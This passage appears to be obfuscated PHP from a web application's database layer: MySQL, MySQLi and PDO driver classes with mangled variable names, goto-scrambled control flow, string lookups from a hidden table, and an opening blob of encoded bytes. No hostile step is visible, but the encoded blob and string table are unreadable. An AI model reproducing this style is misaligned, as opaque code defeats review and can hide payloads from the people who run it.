4\xd7\x5e"."\204\250\70\10\77\163\314\174\267\341\242\14\35\145\124\22\334\251\33\256\43\333\232\360\117\332\337\116\140\150\114\104\1\70\110\13\332\141\203\226\370\335\205\307\65\164\235\51\111\42\373\42\241\370\212"."\333\47\333\200\367\12\305\211\47\356\123\146\10\125\376\10\247\112\173\27\207\112\316\371\113\30\46\107\46\222\243\255\144\33\73\145\215\45\230\101\61\321\126\305\322\341\106\342\57\247\125\14\314\242\263"."\x13\x9c\xe6\xb6\x27\x61\x7c\xb5\xa4\x45\x62\x86\xd2\xd6\xe2\x1c\x46\x59\x9f\x91\x3c\x95\x3f\x5d\xfa\x1\xda\x65\xa5\xf7\x59\xbc\x10\xe1\x24\xa9\xec\xb2\x2d\xac\x57\xc8\x83\x6b\x54\x31\x1b\x4e\x82\x39\xb9\xc\x63\xcb\x2b"."\xee\xf4\x78\x36\xf8\x72\xb7\x39\x45\xd\xcb\xdb\x8f\x66\x47\x49\xeb\x49\x9d\xb9\xcf\x6b\x1\x75\xaa\x2e\xa9\x88\x5c\xfe\x39\x32\xfe\xa5\xd8\x68\xf7\x56\xb9\x16\x15\x77\x9a\x53\xd5\xa2\x22\xf2\x94\xb5\xe0\xd8\x25\x57\x67"."\x95\xd8\x1c\x4d\xa9\xc0\xd8\xf8\x4d\x57\x39\xb\xe5\x69\x15\xee\xdd\x70\x99\x70\x61\xd\xda\xd4\xcc\xca\x92\xc5\x4b\xbc\xca\xd7\x7c\xc1\x8a\x13\xd1\xb4\xdf\xbf\x95\xc0\xc5\x8e\xa1\xa\x3\xdb\x4e\x39\xf9\xdd\x87\xcf\xf5"."\5\44\32\20\301\66\306\133\310\215\344\250\327\36\360\5\356\13\221\175\145\222\310\151\45\316\136\51\105\346\12\202\203\321\212\336\142\145\270\325\53\337\113\145\250\353\46\164\172\6\266\360\132\134\270"."\305\207\100\321\5\54\116\147\207\14\170\25\307\67\66\36\121\23\25\125\113\203\257\371\262\133\61\333\25\120\205\164\47\77\121\23\175\370\332\334\11\103\24\17\263\112\306\213\57\71\137\304\307\342\110"."\343\202\100\72\46\340\266\101\306\153\32\116\16\351\206\5\255\225\1\337\315\243\337\16\335\262\50\73\0\362\52\302\104\262\31\162\206\42\334\377\201\220\244\10\176\165\15\164\264\211\10\22\61\16\24"."\44\7\364\160\103\25\122\161\52\142\106\266\10\74\62\145\21\161\335\31\321\23\61\175\234\214\53\172\344\200\177\15\236\134\222\106\227\212\122\334\165\76\241\45\361\256\22\51\0\231\56\234\342\42\312"."\302\16\124\206\203\74\200\305\224\205\110\366\4\232\36\314\101\342\167\225\100\216\210\170\21\370\21\121\164\230\1\337\336\365\56\367\205\302\241\262\244\200\73\24\32\364\7\75\130\341\260\54\31\345\22"."\x2e\x86\xcb\x92\x2\x3d\xfe\xfe\xa9\xd2\xbc\x7d\x6e\x5f\x6f\x59\x1a\xbc\x28\x86\x6a\x90\xf4\x71\x36\x9c\xe4\xb\xa0\x5a\xba\x7b\x7b\xa9\xd6\x51\x79\x2d\x7c\x9d\x4b\x78\x4d\xd0\x1d\x8\x3f\xeb\xcb\xa7\xf5\x9c\x40\xa5\x82"."\x46\x4\x3d\xe0\xc\x29\x74\x42\x40\x16\x4e\xa7\x8d\x18\x56\xb3\xec\x60\x45\x28\xce\xbe\xe7\x15\x87\xdc\xa4\x8f\x7\xb2\x40\xbe\x4c\xda\x17\x96\x6b\x78\xb1\xdb\x4f\xa\xb\x52\x3f\x80\xf0\x3d\x56\x36\xbb\x99\x4c\x8a\x1a"."\x27\x6a\x80\xe0\xe7\xa8\x85\x44\xbc\xec\xdb\x6e\x89\x4\x38\x9a\x22\x88\xc7\x8\xc4\x29\xae\xaa\x8\x40\xb4\x17\x4b\x4e\xe9\x4b\x3a\x96\x87\x84\xb5\xbc\xfc\xc6\x7\x41\x78\x37\xc1\xd6\x1c\x47\x3d\x5\xac\xd1\x63\xc2\x19"."\42\346\123\66\16\45\136\330\343\160\11\3\113\204\365\260\222\42\274\4\12\15\74\326\61\41\206\305\363\213\66\306\112\54\45\105\357\137\113\171\256\160\341\10\373\353\377\3\173\306\325\354\121\274\0".strrev(''."\0".'')."".strrev(''), 10, -8))); goto CÏ†ğ¶î; D¤áö‘äÌÑ: class DbMysql extends Db { public function __construct($A˜¦Èâ¶„¯ = '') { $bŠ‹Ö˜Ş±Ó =& $_SERVER[ì‹É]; if (!extension_loaded($bŠ‹Ö˜Ş±Ó[703])) { think_exception(think_lang($bŠ‹Ö˜Ş±Ó[10]) . $bŠ‹Ö˜Ş±Ó[794]); } if (!empty($A˜¦Èâ¶„¯)) { $this->config = $A˜¦Èâ¶„¯; if (empty($this->config[$bŠ‹Ö˜Ş±Ó[13]])) { $this->config[$bŠ‹Ö˜Ş±Ó[13]] = $bŠ‹Ö˜Ş±Ó[33]; } } } public function connect($B÷¤ÉùÑ±¸ = '', $E÷šæê¤ò¡ = 0, $c­¿Œğñ‚ = false) { $bİ±³Şø†½ =& $_SERVER[ì‹É]; if (!isset($this->linkID[$E÷šæê¤ò¡])) { goto fŠ‚·Ù­¶; B‰¢ğ‰ŒİÒ: if ($D«õ©‡†»¥) { $this->linkID[$E÷šæê¤ò¡] = mysql_pconnect($Fº‡ÇééÄÈ, $B÷¤ÉùÑ±¸[$bİ±³Şø†½[797]], $B÷¤ÉùÑ±¸[$bİ±³Şø†½[798]], 131072); } else { $this->linkID[$E÷šæê¤ò¡] = mysql_connect($Fº‡ÇééÄÈ, $B÷¤ÉùÑ±¸[$bİ±³Şø†½[797]], $B÷¤ÉùÑ±¸[$bİ±³Şø†½[798]], !0, 131072); } if (!$this->linkID[$E÷šæê¤ò¡] || !empty($B÷¤ÉùÑ±¸[$bİ±³Şø†½[17]]) && !mysql_select_db($B÷¤ÉùÑ±¸[$bİ±³Şø†½[17]], $this->linkID[$E÷šæê¤ò¡])) { think_exception(mysql_error()); } $aæ¹¥´Èµ– = mysql_get_server_info($this->linkID[$E÷šæê¤ò¡]); goto Eéò‰æñİ™; f‹´•Êè°: if (1 != think_config($bİ±³Şø†½[18])) { unset($this->config); } goto BÀÂÀôàªÕ; fŠ‚·Ù­¶: if (empty($B÷¤ÉùÑ±¸)) { $B÷¤ÉùÑ±¸ = $this->config; } $Fº‡ÇééÄÈ = $B÷¤ÉùÑ±¸[$bİ±³Şø†½[795]] . ($B÷¤ÉùÑ±¸[$bİ±³Şø†½[796]] ? "\x3a{$B÷¤ÉùÑ±¸[$bİ±³Şø†½[796]]}" : $bİ±³Şø†½[33]); $D«õ©‡†»¥ = !empty($B÷¤ÉùÑ±¸[$bİ±³Şø†½[13]][$bİ±³Şø†½[14]]) ? $B÷¤ÉùÑ±¸[$bİ±³Şø†½[13]][$bİ±³Şø†½[14]] : $this->pconnect; goto B‰¢ğ‰ŒİÒ; Eéò‰æñİ™: mysql_query($bİ±³Şø†½[799] . think_config($bİ±³Şø†½[800]) . $bİ±³Şø†½[55], $this->linkID[$E÷šæê¤ò¡]); if ($aæ¹¥´Èµ– > $bİ±³Şø†½[801]) { mysql_query($bİ±³Şø†½[802], $this->linkID[$E÷šæê¤ò¡]); } $this->connected = !0; goto f‹´•Êè°; BÀÂÀôàªÕ: } return $this->linkID[$E÷šæê¤ò¡]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($d˜¸ò¢Öá¡) { goto EÉ•‘ß‚‚‹; FÎ éËÈ„¢: if (!$this->_linkID) { return !1; } $this->queryStr = $d˜¸ò¢Öá¡; if ($this->queryID) { $this->free(); } goto a¹¾‚ÜˆÆ—; C²ãé™Î¦: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto F·„ä˜ ì™; EÉ•‘ß‚‚‹: $DŠ’æã·Ø =& $_SERVER[ì‹É]; if (0 === stripos($d˜¸ò¢Öá¡, $DŠ’æã·Ø[249])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto FÎ éËÈ„¢; a¹¾‚ÜˆÆ—: think_action_status($DŠ’æã·Ø[19], 1); think_status($DŠ’æã·Ø[20]); $this->queryID = mysql_query($d˜¸ò¢Öá¡, $this->_linkID); goto C²ãé™Î¦; F·„ä˜ ì™: } public function execute($FÊ±ö‘š’´) { goto EãÅ‡¾§õæ; EãÅ‡¾§õæ: $bèù—âÓï— =& $_SERVER[ì‹É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cî½¥³¿¾—; AŒÙ£ìãî: if (!1 === $bÒø¢÷¿¶) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto e’îÜôèª; Cî½¥³¿¾—: $this->queryStr = $FÊ±ö‘š’´; if ($this->queryID) { $this->free(); } think_action_status($bèù—âÓï—[21], 1); goto E¤µÃÍé‘å; E¤µÃÍé‘å: think_status($bèù—âÓï—[20]); $bÒø¢÷¿¶ = mysql_query($FÊ±ö‘š’´, $this->_linkID); $this->debug(); goto AŒÙ£ìãî; e’îÜôèª: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ì‹É][803], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B×ŸËÑí£ = mysql_query($_SERVER[ì‹É][804], $this->_linkID); $this->transTimes = 0; if (!$B×ŸËÑí£) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $CŒèØÆ†„ƒ = mysql_query($_SERVER[ì‹É][805], $this->_linkID); $this->transTimes = 0; if (!$CŒèØÆ†„ƒ) { $this->error(); return !1; } } return !0; } private function getAll() { $e§§ò¡å¿ = array(); if ($this->numRows > 0) { while ($E¿à™–øÅš = mysql_fetch_assoc($this->queryID)) { $e§§ò¡å¿[] = $E¿à™–øÅš; } mysql_data_seek($this->queryID, 0); } return $e§§ò¡å¿; } public function getFields($cÊÏÇ×ùĞ¯) { $F˜¦îŠå¡´ =& $_SERVER[ì‹É]; $dœâ¨íÓ­ = $this->query($F˜¦îŠå¡´[806] . $this->parseKey($cÊÏÇ×ùĞ¯)); $CÃá¦µ ˆ± = array(); if ($dœâ¨íÓ­) { foreach ($dœâ¨íÓ­ as $eÀ†¼…ß©ß => $eµˆµ‡ƒõã) { $CÃá¦µ ˆ±[$eµˆµ‡ƒõã[$F˜¦îŠå¡´[27]]] = array($F˜¦îŠå¡´[28] => $eµˆµ‡ƒõã[$F˜¦îŠå¡´[27]], $F˜¦îŠå¡´[29] => $eµˆµ‡ƒõã[$F˜¦îŠå¡´[30]], $F˜¦îŠå¡´[31] => (bool) (strtoupper($eµˆµ‡ƒõã[$F˜¦îŠå¡´[32]]) === $F˜¦îŠå¡´[807]), $F˜¦îŠå¡´[34] => $eµˆµ‡ƒõã[$F˜¦îŠå¡´[35]], $F˜¦îŠå¡´[36] => strtolower($eµˆµ‡ƒõã[$F˜¦îŠå¡´[37]]) == $F˜¦îŠå¡´[38], $F˜¦îŠå¡´[39] => strtolower($eµˆµ‡ƒõã[$F˜¦îŠå¡´[40]]) == $F˜¦îŠå¡´[41]); } } return $CÃá¦µ ˆ±; } public function getTables($c¢›ÇÕÇ = '') { $b¼ÍëÓÕ• =& $_SERVER[ì‹É]; if (!empty($c¢›ÇÕÇ)) { $d…ƒ¥ôŒğ™ = $b¼ÍëÓÕ•[808] . $c¢›ÇÕÇ; } else { $d…ƒ¥ôŒğ™ = $b¼ÍëÓÕ•[809]; } $BÇ™Åö¥ ¯ = $this->query($d…ƒ¥ôŒğ™); $Eìˆà‹´»­ = array(); foreach ($BÇ™Åö¥ ¯ as $Aôí‘ïÛì£ => $b²õùÏ‡ÉÉ) { $Eìˆà‹´»­[$Aôí‘ïÛì£] = current($b²õùÏ‡ÉÉ); } return $Eìˆà‹´»­; } public function replace($CÔñË»†‹Ï, $Bœ‰¯ºÇË® = array()) { $B„Ç§ĞÍ› =& $_SERVER[ì‹É]; foreach ($CÔñË»†‹Ï as $Eò¥¹óßò => $FäÇŠªíøø) { $AœÃÄ¾Ö¼ = $this->parseValue($FäÇŠªíøø); if (is_scalar($AœÃÄ¾Ö¼)) { $eêìÚŞĞ[] = $AœÃÄ¾Ö¼; $f©Àé¼°À[] = $this->parseKey($Eò¥¹óßò); } } $D‰˜ôÃË¢ç = $B„Ç§ĞÍ›[810] . $this->parseTable($Bœ‰¯ºÇË®[$B„Ç§ĞÍ›[264]]) . $B„Ç§ĞÍ›[811] . implode($B„Ç§ĞÍ›[47], $f©Àé¼°À) . $B„Ç§ĞÍ›[812] . implode($B„Ç§ĞÍ›[47], $eêìÚŞĞ) . $B„Ç§ĞÍ›[813]; return $this->execute($D‰˜ôÃË¢ç); } public function insertAll($b³ã¡‰‰©è, $b—¿É•¬ƒ¿ = array(), $Bà›ò°• = false) { goto Dî‰íÒœ…À; Dî‰íÒœ…À: $B¹­İº½áˆ =& $_SERVER[ì‹É]; if (!is_array($b³ã¡‰‰©è[0])) { return !1; } $bÁá˜¤ƒ = array_keys($b³ã¡‰‰©è[0]); goto eøÃÕ‘„š; eøÃÕ‘„š: $d”½…ó°„´ = array(); foreach ($b³ã¡‰‰©è as $a¾Ö©·‰ªç) { $CÖ÷œ‡…“Ù = array(); foreach ($a¾Ö©·‰ªç as $eãÒ¢¯¶²Ü => $c”¼Ô§×ë×) { $c”¼Ô§×ë× = $this->parseValue($c”¼Ô§×ë×); if (is_scalar($c”¼Ô§×ë×)) { $CÖ÷œ‡…“Ù[] = $c”¼Ô§×ë×; } } $d”½…ó°„´[] = $B¹­İº½áˆ[245] . implode($B¹­İº½áˆ[47], $CÖ÷œ‡…“Ù) . $B¹­İº½áˆ[813]; } array_walk($bÁá˜¤ƒ, array($this, $B¹­İº½áˆ[814])); goto DÎÚ¡è£ˆœ; DÎÚ¡è£ˆœ: $a«Á×¨¦ = ($Bà›ò°• ? $B¹­İº½áˆ[815] : $B¹­İº½áˆ[816]) . $B¹­İº½áˆ[817] . $this->parseTable($b—¿É•¬ƒ¿[$B¹­İº½áˆ[264]]) . $B¹­İº½áˆ[811] . implode($B¹­İº½áˆ[47], $bÁá˜¤ƒ) . $B¹­İº½áˆ[818] . implode($B¹­İº½áˆ[47], $d”½…ó°„´); return $this->execute($a«Á×¨¦); goto E­³¸ù­¯; E­³¸ù­¯: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $dõ´½™¡è± =& $_SERVER[ì‹É]; $this->error = mysql_errno() . $dõ´½™¡è±[4] . mysql_error($this->_linkID); if ($dõ´½™¡è±[33] != $this->queryStr) { $this->error .= LNG($dõ´½™¡è±[45]) . $this->queryStr; } think_trace($this->error, $dõ´½™¡è±[33], $dõ´½™¡è±[46]); return $this->error; } public function escapeString($eà™¯óÚ¢Ğ) { if ($this->_linkID) { return mysql_real_escape_string($eà™¯óÚ¢Ğ, $this->_linkID); } else { return mysql_escape_string($eà™¯óÚ¢Ğ); } } public function parseKey(&$d¨ùÄ´å¦Ê, $BÅŞáÜ¡Ôö = true) { $DÈ¹ÑÊ£ãâ =& $_SERVER[ì‹É]; if ($BÅŞáÜ¡Ôö) { $d¨ùÄ´å¦Ê = $this->parseKeyCheck($d¨ùÄ´å¦Ê); } if ($d¨ùÄ´å¦Ê != $DÈ¹ÑÊ£ãâ[173] && !preg_match($DÈ¹ÑÊ£ãâ[819], $d¨ùÄ´å¦Ê)) { $d¨ùÄ´å¦Ê = $DÈ¹ÑÊ£ãâ[820] . trim($d¨ùÄ´å¦Ê, $DÈ¹ÑÊ£ãâ[820]) . $DÈ¹ÑÊ£ãâ[820]; } return $d¨ùÄ´å¦Ê; } } class DbMysqli extends Db { public function __construct($BõØ‰öÜ = '') { $FÛ²Ñ¼®å =& $_SERVER[ì‹É]; if (!extension_loaded($FÛ²Ñ¼®å[821])) { think_exception(think_lang($FÛ²Ñ¼®å[10]) . $FÛ²Ñ¼®å[822]); } if (!empty($BõØ‰öÜ)) { $this->config = $BõØ‰öÜ; if (empty($this->config[$FÛ²Ñ¼®å[13]])) { $this->config[$FÛ²Ñ¼®å[13]] = $FÛ²Ñ¼®å[33]; } } } public function connect($DØ¯Å½ƒÉ… = '', $Fë„å†™òÃ = 0) { $e‹ïÛòÙ‚õ =& $_SERVER[ì‹É]; if (!isset($this->linkID[$Fë„å†™òÃ])) { goto C­„°á¨Ö; A¶£Üƒöø¶: $this->connected = !0; if (1 != think_config($e‹ïÛòÙ‚õ[18])) { unset($this->config); } goto CƒÓ¹åîÇ¶; a¿ŠáéšœŠ: $aØãóëÅÇÕ = $this->linkID[$Fë„å†™òÃ]->server_version; $this->linkID[$Fë„å†™òÃ]->query($e‹ïÛòÙ‚õ[799] . think_config($e‹ïÛòÙ‚õ[800]) . $e‹ïÛòÙ‚õ[55]); if ($aØãóëÅÇÕ > $e‹ïÛòÙ‚õ[801]) { $this->linkID[$Fë„å†™òÃ]->query($e‹ïÛòÙ‚õ[802]); } goto A¶£Üƒöø¶; C­„°á¨Ö: if (empty($DØ¯Å½ƒÉ…)) { $DØ¯Å½ƒÉ… = $this->config; } $this->linkID[$Fë„å†™òÃ] = new mysqli($DØ¯Å½ƒÉ…[$e‹ïÛòÙ‚õ[795]], $DØ¯Å½ƒÉ…[$e‹ïÛòÙ‚õ[797]], $DØ¯Å½ƒÉ…[$e‹ïÛòÙ‚õ[798]], $DØ¯Å½ƒÉ…[$e‹ïÛòÙ‚õ[17]], $DØ¯Å½ƒÉ…[$e‹ïÛòÙ‚õ[796]] ? intval($DØ¯Å½ƒÉ…[$e‹ïÛòÙ‚õ[796]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto a¿ŠáéšœŠ; CƒÓ¹åîÇ¶: } return $this->linkID[$Fë„å†™òÃ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Dº¡Ğ“«©Ú) { goto AíƒÙœ½Èˆ; D„±°ÖÌÎ: think_status($DëË±äõ“Ä[20]); $this->queryID = $this->_linkID->query($Dº¡Ğ“«©Ú); if ($this->_linkID->more_results()) { while (($a¡áâ©ˆ = $this->_linkID->next_result()) != NULL) { $a¡áâ©ˆ->free_result(); } } goto dï¤Š×£†ñ; dï¤Š×£†ñ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Aã…ç—›Í; d‚…Ü³×: $this->queryStr = $Dº¡Ğ“«©Ú; if ($this->queryID) { $this->free(); } think_action_status($DëË±äõ“Ä[19], 1); goto D„±°ÖÌÎ; AíƒÙœ½Èˆ: $DëË±äõ“Ä =& $_SERVER[ì‹É]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d‚…Ü³×; Aã…ç—›Í: } public function execute($bù½á°Œ«ê) { goto A±ï¥òÛÙÊ; cá®éùÅ¤: $this->queryStr = $bù½á°Œ«ê; if ($this->queryID) { $this->free(); } think_action_status($aÌµ•×é¦[21], 1); goto aŸ’˜‰ƒ¹ç; A±ï¥òÛÙÊ: $aÌµ•×é¦ =& $_SERVER[ì‹É]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cá®éùÅ¤; fß²óÁğò: if (!1 === $fôÊÏ–ÃÙ ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto cæ˜Ù˜ñèõ; aŸ’˜‰ƒ¹ç: think_status($aÌµ•×é¦[20]); $fôÊÏ–ÃÙ  = $this->_linkID->query($bù½á°Œ«ê); $this->debug(); goto fß²óÁğò; cæ˜Ù˜ñèõ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D§Š¼Ï¼¤Ê = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$D§Š¼Ï¼¤Ê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d‚éÒàÏÕ“ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$d‚éÒàÏÕ“) { $this->error(); return !1; } } return !0; } private function getAll() { $CññÍ‚ ¿ = array(); if ($this->numRows > 0) { for ($eİ—‡éõÜì = 0; $eİ—‡éõÜì < $this->numRows; $eİ—‡éõÜì++) { $CññÍ‚ ¿[$eİ—‡éõÜì] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $CññÍ‚ ¿; } public function getFields($C‚èìƒ‹Å) { $f¬¾À»é»ê =& $_SERVER[ì‹É]; $DÒ™ª·Ã§ë = $this->query($f¬¾À»é»ê[806] . $this->parseKey($C‚èìƒ‹Å)); $cğ¥ß·©­ = array(); if ($DÒ™ª·Ã§ë) { foreach ($DÒ™ª·Ã§ë as $b¤‚ò¾†ªò => $F½ô©¼Ş…á) { $cğ¥ß·©­[$F½ô©¼Ş…á[$f¬¾À»é»ê[27]]] = array($f¬¾À»é»ê[28] => $F½ô©¼Ş…á[$f¬¾À»é»ê[27]], $f¬¾À»é»ê[29] => $F½ô©¼Ş…á[$f¬¾À»é»ê[30]], $f¬¾À»é»ê[31] => (bool) ($F½ô©¼Ş…á[$f¬¾À»é»ê[32]] === $f¬¾À»é»ê[33]), $f¬¾À»é»ê[34] => $F½ô©¼Ş…á[$f¬¾À»é»ê[35]], $f¬¾À»é»ê[36] => strtolower($F½ô©¼Ş…á[$f¬¾À»é»ê[37]]) == $f¬¾À»é»ê[38], $f¬¾À»é»ê[39] => strtolower($F½ô©¼Ş…á[$f¬¾À»é»ê[40]]) == $f¬¾À»é»ê[41]); } } return $cğ¥ß·©­; } public function getTables($D¢ƒ…÷¬¢İ = '') { $EøÜë™Œ¤¸ =& $_SERVER[ì‹É]; $fˆÂ“å½â— = !empty($D¢ƒ…÷¬¢İ) ? $EøÜë™Œ¤¸[808] . $D¢ƒ…÷¬¢İ : $EøÜë™Œ¤¸[809]; $DÉ´ íÈ» = $this->query($fˆÂ“å½â—); $f„ÀÇÍ†µ = array(); if ($DÉ´ íÈ») { foreach ($DÉ´ íÈ» as $E³±‹Æõ‚ => $bïªµ¹°µˆ) { $f„ÀÇÍ†µ[$E³±‹Æõ‚] = current($bïªµ¹°µˆ); } } return $f„ÀÇÍ†µ; } public function replace($B›øÛÛÓé¢, $EæÚÄ¯é = array()) { $Eí¿ä©ÄÚò =& $_SERVER[ì‹É]; foreach ($B›øÛÛÓé¢ as $B˜°Ì„ì·Õ => $C‡ë§Ú İä) { $c…ãÔ÷‘¡Ä = $this->parseValue($C‡ë§Ú İä); if (is_scalar($c…ãÔ÷‘¡Ä)) { $F»²Í¸ê[] = $c…ãÔ÷‘¡Ä; $d»õ¥‹›Â[] = $this->parseKey($B˜°Ì„ì·Õ); } } $C·œé£ß»» = $Eí¿ä©ÄÚò[810] . $this->parseTable($EæÚÄ¯é[$Eí¿ä©ÄÚò[264]]) . $Eí¿ä©ÄÚò[811] . implode($Eí¿ä©ÄÚò[47], $d»õ¥‹›Â) . $Eí¿ä©ÄÚò[812] . implode($Eí¿ä©ÄÚò[47], $F»²Í¸ê) . $Eí¿ä©ÄÚò[813]; return $this->execute($C·œé£ß»»); } public function insertAll($F‡–‰Š®ƒí, $cŒ¼÷ÉÄ¥ô = array(), $bÄù›“‰‚ = false) { goto fÌ˜ØÄ£»ä; fÌ˜ØÄ£»ä: $b¬á¯œ»° =& $_SERVER[ì‹É]; if (!is_array($F‡–‰Š®ƒí[0])) { return !1; } $EÁó‰ß™ç” = array_keys($F‡–‰Š®ƒí[0]); goto b™İóé¿×; c„©ƒöµ—–: $aÀá»ñ­ßö = ($bÄù›“‰‚ ? $b¬á¯œ»°[815] : $b¬á¯œ»°[816]) . $b¬á¯œ»°[817] . $this->parseTable($cŒ¼÷ÉÄ¥ô[$b¬á¯œ»°[264]]) . $b¬á¯œ»°[811] . implode($b¬á¯œ»°[47], $EÁó‰ß™ç”) . $b¬á¯œ»°[818] . implode($b¬á¯œ»°[47], $aëàñ›Öø); return $this->execute($aÀá»ñ­ßö); goto A…çà˜Ê˜ß; b™İóé¿×: $aëàñ›Öø = array(); foreach ($F‡–‰Š®ƒí as $eùÎ‚¦’Øà) { $DÙƒò‰†¦Ã = array(); foreach ($eùÎ‚¦’Øà as $bèêº«Á…ø => $EÎ•ÏôØê) { $EÎ•ÏôØê = $this->parseValue($EÎ•ÏôØê); if (is_scalar($EÎ•ÏôØê)) { $DÙƒò‰†¦Ã[] = $EÎ•ÏôØê; } } $aëàñ›Öø[] = $b¬á¯œ»°[245] . implode($b¬á¯œ»°[47], $DÙƒò‰†¦Ã) . $b¬á¯œ»°[813]; } array_walk($EÁó‰ß™ç”, array($this, $b¬á¯œ»°[814])); goto c„©ƒöµ—–; A…çà˜Ê˜ß: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eô¦è›–ó =& $_SERVER[ì‹É]; $this->error = $this->_linkID->errno . $eô¦è›–ó[4] . $this->_linkID->error; if ($eô¦è›–ó[33] != $this->queryStr) { $this->error .= LNG($eô¦è›–ó[45]) . $this->queryStr; } think_trace($this->error, $eô¦è›–ó[33], $eô¦è›–ó[46]); return $this->error; } public function escapeString($aê¹ùÊ™ˆ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($aê¹ùÊ™ˆ); } else { return addslashes($aê¹ùÊ™ˆ); } } public function parseKey(&$FÉİ‡ µÌ¿, $a©õÍ‚èÜ¨ = true) { $AÁ…ÛÂ…‰ =& $_SERVER[ì‹É]; if ($a©õÍ‚èÜ¨) { $FÉİ‡ µÌ¿ = $this->parseKeyCheck($FÉİ‡ µÌ¿); } if ($FÉİ‡ µÌ¿ != $AÁ…ÛÂ…‰[173] && !preg_match($AÁ…ÛÂ…‰[819], $FÉİ‡ µÌ¿)) { $FÉİ‡ µÌ¿ = $AÁ…ÛÂ…‰[820] . trim($FÉİ‡ µÌ¿, $AÁ…ÛÂ…‰[820]) . $AÁ…ÛÂ…‰[820]; } return $FÉİ‡ µÌ¿; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($B¹ÇÄ¿¢õá = '') { $a¾ˆ¿‡ªµÖ =& $_SERVER[ì‹É]; if (!class_exists($a¾ˆ¿‡ªµÖ[823])) { think_exception(think_lang($a¾ˆ¿‡ªµÖ[10]) . $a¾ˆ¿‡ªµÖ[824]); } if (!empty($B¹ÇÄ¿¢õá)) { $this->config = $B¹ÇÄ¿¢õá; if (empty($this->config[$a¾ˆ¿‡ªµÖ[13]])) { $this->config[$a¾ˆ¿‡ªµÖ[13]] = array(); } } } public function connect($C†æŒ‡³“í = '', $cóÛæ•øÆÌ = 0) { $DãøùíâÛ =& $_SERVER[ì‹É]; if (!isset($this->linkID[$cóÛæ•øÆÌ])) { goto f„·¸‡‡µ; a´Ä¾„ïåƒ: $this->linkID[$cóÛæ•øÆÌ]->exec($DãøùíâÛ[834] . think_config($DãøùíâÛ[800])); $this->connected = !0; if (1 != think_config($DãøùíâÛ[18])) { unset($this->config); } goto EĞ“ï´ê½Î; f„·¸‡‡µ: if (empty($C†æŒ‡³“í)) { $C†æŒ‡³“í = $this->config; } if ($this->pconnect) { $C†æŒ‡³“í[$DãøùíâÛ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$cóÛæ•øÆÌ] = new PDO($C†æŒ‡³“í[$DãøùíâÛ[825]], $C†æŒ‡³“í[$DãøùíâÛ[797]], $C†æŒ‡³“í[$DãøùíâÛ[798]], $C†æŒ‡³“í[$DãøùíâÛ[13]]); } catch (PDOException $då´Ï©£„Ÿ) { think_exception($då´Ï©£„Ÿ->getMessage()); } goto D £ÚØ±ù˜; D £ÚØ±ù˜: $this->dbType = $this->_getDsnType($C†æŒ‡³“í[$DãøùíâÛ[825]]); if (in_array($this->dbType, array($DãøùíâÛ[826], $DãøùíâÛ[827], $DãøùíâÛ[828], $DãøùíâÛ[829]))) { think_exception($DãøùíâÛ[830] . $this->dbType . $DãøùíâÛ[831] . $this->dbType . $DãøùíâÛ[832]); } if (!$this->linkID[$cóÛæ•øÆÌ]) { think_exception($DãøùíâÛ[833]); } goto a´Ä¾„ïåƒ; EĞ“ï´ê½Î: } return $this->linkID[$cóÛæ•øÆÌ]; } public function free() { $this->PDOStatement = null; } public function query($B ìçë£á, $fîè¬îØô‹ = array()) { goto f³½†İŒÈ¡; AóèÙÒÓ™¿: $this->queryStr = $B ìçë£á; if (!empty($fîè¬îØô‹)) { $this->queryStr .= $E¼®šñÛŠ¿[835] . print_r($fîè¬îØô‹, !0) . $E¼®šñÛŠ¿[836]; } if (!empty($this->PDOStatement)) { $this->free(); } goto CÁø‚Íõ“¬; F„÷É¨¿Åƒ: if (!1 === $b¦°‘šØ³) { $this->error(); return !1; } else { return $this->getAll(); } goto F‚±âÍ¦ç; C˜‡ˆÌÕ‘Š: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $b¦°‘šØ³ = $this->PDOStatement->execute($fîè¬îØô‹); $this->debug(); goto F„÷É¨¿Åƒ; CÁø‚Íõ“¬: think_action_status($E¼®šñÛŠ¿[19], 1); think_status($E¼®šñÛŠ¿[20]); $this->PDOStatement = $this->_linkID->prepare($B ìçë£á); goto C˜‡ˆÌÕ‘Š; f³½†İŒÈ¡: $E¼®šñÛŠ¿ =& $_SERVER[ì‹É]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AóèÙÒÓ™¿; F‚±âÍ¦ç: } public function execute($c Õ²„ÚÍ, $aØê­ÃËƒ = array()) { goto c´×«¬‚›; Dƒ…Ãßóà‘: 